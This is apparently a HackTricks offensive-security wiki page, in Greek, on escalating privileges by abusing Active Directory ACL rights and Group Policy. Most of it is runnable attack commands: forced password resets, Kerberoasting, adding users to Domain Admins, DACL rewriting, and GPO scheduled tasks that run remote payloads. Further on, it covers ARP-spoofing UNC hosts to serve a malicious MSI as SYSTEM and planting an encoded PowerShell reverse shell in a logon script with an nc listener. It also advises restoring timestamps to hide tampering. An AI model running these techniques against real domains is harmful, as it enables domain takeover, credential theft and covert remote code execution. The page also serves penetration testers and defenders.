# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια σύνοψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, ανατρέξτε στα αρχικά άρθρα.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Δικαιώματα GenericAll σε User**

Αυτό το privilege παρέχει σε έναν attacker πλήρη έλεγχο ενός λογαριασμού χρήστη-στόχου. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` με τη χρήση της εντολής `Get-ObjectAcl`, ένας attacker μπορεί να:

- **Αλλάξει το Password του Target**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο attacker μπορεί να κάνει reset το password του χρήστη.
- Από Linux, μπορείτε να κάνετε το ίδιο μέσω SAMR με το Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Αν ο λογαριασμός είναι απενεργοποιημένος, καταργήστε τη σημαία UAC**: Το `GenericAll` επιτρέπει την επεξεργασία του `userAccountControl`. Από Linux, το BloodyAD μπορεί να αφαιρέσει τη σημαία `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Ανάθεσε ένα SPN στον λογαριασμό του χρήστη, ώστε να γίνει kerberoastable, και στη συνέχεια χρησιμοποίησε τα Rubeus και targetedKerberoast.py για να εξαγάγεις και να επιχειρήσεις να κάνεις crack στα hashes του ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Απενεργοποίηση του pre-authentication για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Με `GenericAll` σε έναν user μπορείτε να προσθέσετε ένα certificate-based credential και να κάνετε authenticate ως αυτός, χωρίς να αλλάξετε το password του. Δείτε:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Δικαιώματα GenericAll σε Group**

Αυτό το privilege επιτρέπει σε έναν attacker να χειραγωγήσει τα group memberships, εάν έχει δικαιώματα `GenericAll` σε ένα group όπως το `Domain Admins`. Αφού εντοπίσει το distinguished name του group με το `Get-NetGroup`, ο attacker μπορεί να:

- **Προσθέσει τον εαυτό του στο Group Domain Admins**: Αυτό μπορεί να γίνει μέσω direct commands ή με τη χρήση modules όπως τα Active Directory ή PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Από Linux μπορείτε επίσης να αξιοποιήσετε το BloodyAD για να προσθέσετε τον εαυτό σας σε αυθαίρετες ομάδες, όταν έχετε GenericAll/Write δικαιώματα πάνω σε αυτές. Αν η ομάδα-στόχος είναι nested στην “Remote Management Users”, θα αποκτήσετε αμέσως πρόσβαση WinRM σε hosts που αναγνωρίζουν αυτή την ομάδα:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write σε Computer/User**

Η κατοχή αυτών των δικαιωμάτων σε ένα computer object ή έναν user account επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την ανάληψη ελέγχου ενός computer object.
- **Shadow Credentials**: Χρήση αυτής της τεχνικής για impersonation ενός computer ή user account, μέσω εκμετάλλευσης των δικαιωμάτων για τη δημιουργία shadow credentials.

## **WriteProperty σε Group**

Αν ένας user έχει δικαιώματα `WriteProperty` σε όλα τα objects ενός συγκεκριμένου group (π.χ., `Domain Admins`), μπορεί να:

- **Προσθέσει τον εαυτό του στο Domain Admins Group**: Αυτό επιτυγχάνεται μέσω του συνδυασμού των εντολών `net user` και `Add-NetGroupUser` και επιτρέπει privilege escalation μέσα στο domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) σε Group**

Αυτό το privilege επιτρέπει στους attackers να προσθέσουν τους εαυτούς τους σε συγκεκριμένα groups, όπως το `Domain Admins`, μέσω commands που τροποποιούν απευθείας το group membership. Η ακόλουθη ακολουθία commands επιτρέπει την προσθήκη του ίδιου του χρήστη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ένα παρόμοιο privilege επιτρέπει στους attackers να προσθέσουν απευθείας τους εαυτούς τους σε groups, τροποποιώντας τις ιδιότητες των groups, εφόσον διαθέτουν το δικαίωμα `WriteProperty` σε αυτά τα groups. Η επιβεβαίωση και η εκτέλεση αυτού του privilege πραγματοποιούνται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών πρόσβασης χωρίς να είναι γνωστός ο τρέχων κωδικός. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να πραγματοποιηθούν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας διάφορες μεθόδους για την επαναφορά του κωδικού πρόσβασης ενός χρήστη, συμπεριλαμβανομένων interactive sessions και one-liners για non-interactive περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, επιδεικνύοντας την ευελιξία των attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Αν ένας attacker διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε ένα group, μπορεί να αλλάξει την ιδιοκτησία του group σε δική του. Αυτό είναι ιδιαίτερα σημαντικό όταν το συγκεκριμένο group είναι το `Domain Admins`, καθώς η αλλαγή ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο των attributes και του membership του group. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού object μέσω του `Get-ObjectAcl` και, στη συνέχεια, τη χρήση του `Set-DomainObjectOwner` για την τροποποίηση του owner, είτε μέσω SID είτε μέσω name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite σε User**

Αυτή η άδεια επιτρέπει σε έναν attacker να τροποποιεί τις ιδιότητες ενός user. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο attacker μπορεί να αλλάξει τη διαδρομή του logon script ενός user, ώστε να εκτελείται ένα κακόβουλο script κατά το logon του user. Αυτό επιτυγχάνεται με τη χρήση της εντολής `Set-ADObject`, για την ενημέρωση της ιδιότητας `scriptpath` του target user, ώστε να δείχνει στο script του attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Με αυτό το privilege, οι attackers μπορούν να χειραγωγήσουν τη συμμετοχή σε groups, όπως προσθέτοντας τους εαυτούς τους ή άλλους users σε συγκεκριμένα groups. Η διαδικασία περιλαμβάνει τη δημιουργία ενός credential object, τη χρήση του για την προσθήκη ή την αφαίρεση users από ένα group και την επαλήθευση των αλλαγών στη συμμετοχή με εντολές PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Από Linux, το Samba `net` μπορεί να προσθέσει/αφαιρέσει μέλη όταν διαθέτετε `GenericWrite` στην ομάδα (χρήσιμο όταν το PowerShell/RSAT δεν είναι διαθέσιμο):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Η κατοχή ενός AD object και η ύπαρξη δικαιωμάτων `WriteDACL` σε αυτό επιτρέπει σε έναν attacker να εκχωρήσει στον εαυτό του δικαιώματα `GenericAll` πάνω στο object. Αυτό επιτυγχάνεται μέσω χειρισμού του ADSI, παρέχοντας πλήρη έλεγχο πάνω στο object και τη δυνατότητα τροποποίησης των group memberships του. Παρ' όλα αυτά, υπάρχουν περιορισμοί κατά την προσπάθεια εκμετάλλευσης αυτών των δικαιωμάτων μέσω των cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Όταν έχετε `WriteOwner` και `WriteDacl` σε έναν user ή service account, μπορείτε να αποκτήσετε πλήρη έλεγχο και να κάνετε reset στο password του χρησιμοποιώντας PowerView, χωρίς να γνωρίζετε το παλιό password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
- Ίσως χρειαστεί πρώτα να αλλάξετε τον ιδιοκτήτη σε εσάς, αν έχετε μόνο `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

Το DCSync attack εκμεταλλεύεται συγκεκριμένα replication permissions στο domain για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των credentials των χρηστών. Αυτή η ισχυρή τεχνική απαιτεί permissions όπως `DS-Replication-Get-Changes`, επιτρέποντας στους attackers να εξάγουν ευαίσθητες πληροφορίες από το AD environment χωρίς άμεση πρόσβαση σε Domain Controller.<sup>[[5]](#references)</sup> [**Μάθετε περισσότερα για το DCSync attack εδώ.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Η delegated access για τη διαχείριση Group Policy Objects (GPOs) μπορεί να παρουσιάσει σημαντικούς security risks. Για παράδειγμα, αν σε έναν χρήστη όπως ο `offense\spotless` έχουν ανατεθεί δικαιώματα διαχείρισης GPO, μπορεί να διαθέτει privileges όπως **WriteProperty**, **WriteDacl** και **WriteOwner**. Αυτά τα permissions μπορούν να χρησιμοποιηθούν καταχρηστικά για malicious σκοπούς, όπως εντοπίστηκε με τη χρήση του PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Για τον εντοπισμό misconfigured GPOs, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την εύρεση των GPOs που ένας συγκεκριμένος χρήστης έχει permissions να διαχειρίζεται: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Είναι δυνατός ο εντοπισμός των computers στα οποία εφαρμόζεται ένα συγκεκριμένο GPO, βοηθώντας στην κατανόηση του scope του πιθανού impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Για να δείτε ποια policies εφαρμόζονται σε έναν συγκεκριμένο computer, μπορούν να χρησιμοποιηθούν commands όπως το `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Ο εντοπισμός των organizational units (OUs) που επηρεάζονται από μια συγκεκριμένη policy μπορεί να γίνει με τη χρήση του `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το tool [**GPOHound**](https://github.com/cogiceo/GPOHound) για να κάνετε enumerate GPOs και να εντοπίσετε issues σε αυτά.

### Abuse GPO - New-GPOImmediateTask

Τα misconfigured GPOs μπορούν να γίνουν exploit για την εκτέλεση code, για παράδειγμα με τη δημιουργία ενός immediate scheduled task. Αυτό μπορεί να χρησιμοποιηθεί για την προσθήκη ενός χρήστη στο local administrators group των επηρεαζόμενων machines, αυξάνοντας σημαντικά τα privileges:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το GroupPolicy module, εφόσον είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPO, καθώς και τον ορισμό preferences, όπως registry values, για την εκτέλεση backdoors στους επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και τη σύνδεση ενός χρήστη στον υπολογιστή για την εκτέλεση:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

Το SharpGPOAbuse προσφέρει μια μέθοδο για την κατάχρηση υπαρχόντων GPO, προσθέτοντας tasks ή τροποποιώντας ρυθμίσεις χωρίς να απαιτείται η δημιουργία νέων GPO. Αυτό το tool απαιτεί τροποποίηση υπαρχόντων GPO ή χρήση εργαλείων RSAT για τη δημιουργία νέων πριν από την εφαρμογή αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

Οι ενημερώσεις GPO πραγματοποιούνται συνήθως περίπου κάθε 90 λεπτά. Για την επιτάχυνση αυτής της διαδικασίας, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί η εντολή `gpupdate /force` στον υπολογιστή-στόχο, ώστε να επιβληθεί άμεση ενημέρωση πολιτικής. Η εντολή διασφαλίζει ότι όλες οι τροποποιήσεις στα GPO εφαρμόζονται χωρίς να χρειάζεται αναμονή για τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Under the Hood

Κατά την επιθεώρηση των Scheduled Tasks για ένα συγκεκριμένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως η `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω scripts ή command-line εργαλείων με στόχο την τροποποίηση της συμπεριφοράς του συστήματος ή την κλιμάκωση προνομίων.

Η δομή της εργασίας, όπως εμφανίζεται στο XML configuration file που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες του scheduled task - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των triggers της. Αυτό το αρχείο αναπαριστά τον τρόπο με τον οποίο ορίζονται και διαχειρίζονται τα scheduled tasks μέσα στα GPOs, παρέχοντας μια μέθοδο εκτέλεσης arbitrary εντολών ή scripts στο πλαίσιο της επιβολής πολιτικών.

### Users and Groups

Τα GPOs επιτρέπουν επίσης τη χειραγώγηση των memberships χρηστών και groups στα target συστήματα. Με την απευθείας επεξεργασία των αρχείων πολιτικής Users and Groups, οι attackers μπορούν να προσθέσουν users σε privileged groups, όπως το τοπικό group `administrators`. Αυτό είναι εφικτό μέσω της ανάθεσης permissions διαχείρισης GPO, η οποία επιτρέπει την τροποποίηση των αρχείων πολιτικής για την προσθήκη νέων users ή την αλλαγή των memberships των groups.

Το XML configuration file για τα Users and Groups περιγράφει τον τρόπο υλοποίησης αυτών των αλλαγών. Με την προσθήκη entries σε αυτό το αρχείο, σε συγκεκριμένους users μπορούν να εκχωρηθούν elevated privileges σε όλα τα affected συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση για privilege escalation μέσω GPO manipulation.

Επιπλέον, μπορούν να εξεταστούν πρόσθετες μέθοδοι για την εκτέλεση code ή τη διατήρηση persistence, όπως η αξιοποίηση logon/logoff scripts, η τροποποίηση registry keys για autoruns, η εγκατάσταση software μέσω αρχείων .msi ή η επεξεργασία service configurations. Αυτές οι τεχνικές παρέχουν διάφορες δυνατότητες για τη διατήρηση access και τον έλεγχο target συστημάτων μέσω της κατάχρησης των GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

Το `WriteGPLink` σε ένα OU/domain επιτρέπει την τροποποίηση του attribute `gPLink` του target container και την **επιβολή εφαρμογής ενός existing GPO** χωρίς επεξεργασία του ίδιου του GPO. Αυτό γίνεται ενδιαφέρον όταν το linked GPO αναφέρεται ήδη σε remote content μέσω **UNC paths** (`\\HOST\share\...`), επειδή οι authenticated users μπορούν να διαβάσουν το **SYSVOL** και να αναζητήσουν reusable policies offline.<sup>[[11]](#references)</sup>

High-level workflow:

1. Χρησιμοποιήστε το BloodHound για να εντοπίσετε έναν principal με `WriteGPLink` σε ένα OU και να enumerήσετε τους computers/users μέσα σε αυτό το OU.
2. Κάντε clone το `SYSVOL` σε read-only mode και κάντε parse τα GPOs, αναζητώντας **Software Installation**, **drive mappings** (`Drives.xml`) και **logon/startup scripts** που αναφέρονται σε UNC paths.
3. Προτιμήστε policies που δείχνουν σε ένα **direct hostname** (για παράδειγμα `\\DC02\share\pkg.msi`) αντί για DFS/domain-namespace paths, επειδή τα paths που βασίζονται σε hostname είναι ευκολότερο να ανακατευθυνθούν με L2 spoofing.
4. Προσθέστε το επιλεγμένο GPO GUID στο `gPLink` του target OU, ώστε το victim να επεξεργαστεί αυτή την already-existing policy.
5. Στο ίδιο broadcast domain, πραγματοποιήστε ARP spoofing του UNC host και κάντε bind το IP τοπικά (`ip addr add <target_ip>/32 dev <iface>`), ώστε η SMB traffic του victim να φτάσει στο host σας.
6. Παρέχετε το αναμενόμενο path/filename από έναν attacker SMB server (για παράδειγμα `smbserver.py`) και περιμένετε το normal policy processing.

Παράδειγμα συλλογής `SYSVOL` και GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Συνδέστε το υπάρχον GPO με το OU-στόχο:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Αν το συνδεδεμένο GPO αναπτύσσει ένα MSI από διαδρομή UNC, ο client θα το ανακτήσει κατά την **εκκίνηση του υπολογιστή** και θα το εγκαταστήσει ως **`NT AUTHORITY\SYSTEM`**. Κάνοντας spoofing στον host που αναφέρεται και παρέχοντας ένα malicious MSI κάτω από το **ίδιο share/path/name**, μπορείτε να μετατρέψετε το `WriteGPLink` σε εκτέλεση κώδικα SYSTEM **χωρίς τροποποίηση του SYSVOL**.

Σημαντικοί περιορισμοί:

- **Το timing έχει σημασία**: ο νέος σύνδεσμος εμφανίζεται στο policy refresh (συνήθως περίπου κάθε 90 λεπτά), αλλά το **Software Installation** συνήθως ενεργοποιείται κατά το **reboot**.
- Ο Windows Installer συνήθως παρακολουθεί το deployment χρησιμοποιώντας το package **`ProductCode`**. Αν το product είναι ήδη εγκατεστημένο, το deployment μπορεί να παραλειφθεί.
- Για να αποφύγετε την απόρριψη από τον installer, κάντε patch το rogue MSI ώστε τα **`ProductCode`** και **`PackageCode`** του να ταιριάζουν με εκείνα του legitimate package που αναμένει το GPO.
- Παλιά αρχεία advertisement `.aas` ενδέχεται να παραμένουν στο `SYSVOL`, επομένως επιβεβαιώστε ότι το deployment εξακολουθεί να φαίνεται ενεργό πριν βασιστείτε σε αυτό.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Τα GPP drive mappings στο `Drives.xml` προκαλούν authentication των χρηστών προς το ρυθμισμένο UNC path κατά το logon ή την επανασύνδεση. Αν κάνεις spoof τον referenced host, μπορείς να κάνεις capture **NetNTLMv2**. Αν το SMB γίνει σκόπιμα να αποτύχει, τα Windows ενδέχεται να δοκιμάσουν ξανά μέσω **WebDAV**, στέλνοντας **NTLM over HTTP**, κάτι που είναι πολύ πιο ευέλικτο για relays προς **LDAP(S)**, **AD CS** ή **SMB**.

#### Logon/startup script UNC hijack

Το ίδιο pattern εφαρμόζεται σε UNC-hosted scripts που εντοπίζονται στο `SYSVOL`:

- Τα **Logon scripts** συνήθως εκτελούνται στο context του **user**.
- Τα **Startup scripts** συνήθως εκτελούνται στο context του **computer / SYSTEM**.

Αν το script path δείχνει σε spoofable hostname, κάνε redirect το UNC host και κάνε serve replacement script content από την αναμενόμενη τοποθεσία.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths κάτω από `\\<dc>\SYSVOL\<domain>\scripts\` ή `\\<dc>\NETLOGON\` επιτρέπουν tampering με logon scripts που εκτελούνται κατά το user logon μέσω GPO. Αυτό παρέχει code execution στο security context των χρηστών που κάνουν logon.

### Locate logon scripts
- Έλεγξε τα user attributes για configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Πραγματοποιήστε crawl στα domain shares για να εντοπίσετε shortcuts ή αναφορές σε scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Αναλύστε αρχεία `.lnk` για να εντοπίσετε προορισμούς που παραπέμπουν σε SYSVOL/NETLOGON (χρήσιμο τέχνασμα DFIR και για attackers χωρίς άμεση πρόσβαση σε GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- Το BloodHound εμφανίζει το attribute `logonScript` (scriptPath) στους κόμβους χρηστών, όταν υπάρχει.

### Επικύρωση write access (μην εμπιστεύεστε τις λίστες των shares)
Τα automated tools ενδέχεται να εμφανίζουν τα SYSVOL/NETLOGON ως read-only, όμως τα υποκείμενα NTFS ACLs μπορεί να επιτρέπουν write access. Να κάνετε πάντα test:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Αν αλλάξει το μέγεθος του αρχείου ή το mtime, έχετε write. Διατηρήστε τα originals πριν από την τροποποίηση.

### Poison a VBScript logon script for RCE
Προσθέστε μια εντολή που εκκινεί ένα PowerShell reverse shell (δημιουργήστε το από το revshells.com) και διατηρήστε την original λογική, ώστε να μην διακοπεί η business λειτουργία:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Εκτελέστε listener στον host σας και περιμένετε την επόμενη interactive σύνδεση:
```bash
rlwrap -cAr nc -lnvp 443
```
Σημειώσεις:
- Η εκτέλεση πραγματοποιείται υπό το token του logging user (όχι του SYSTEM). Το scope είναι ο σύνδεσμος GPO (OU, site, domain) στον οποίο εφαρμόζεται το συγκεκριμένο script.
- Μετά τη χρήση, κάντε cleanup επαναφέροντας το αρχικό περιεχόμενο και τα timestamps.


## Αναφορές

- [1] [Κατάχρηση Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts και Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Η ενημέρωση της διαδρομής επίθεσης ACL](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Αύξηση privileges με ACLs στο Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Σάρωση για Active Directory Privileges και Privileged Accounts](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operations σε AD attributes/UAC από Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: Κατάχρηση AD ACL, cracking Argon2 του KeePassXC και αποκρυπτογράφηση DPAPI έως το DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution και NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
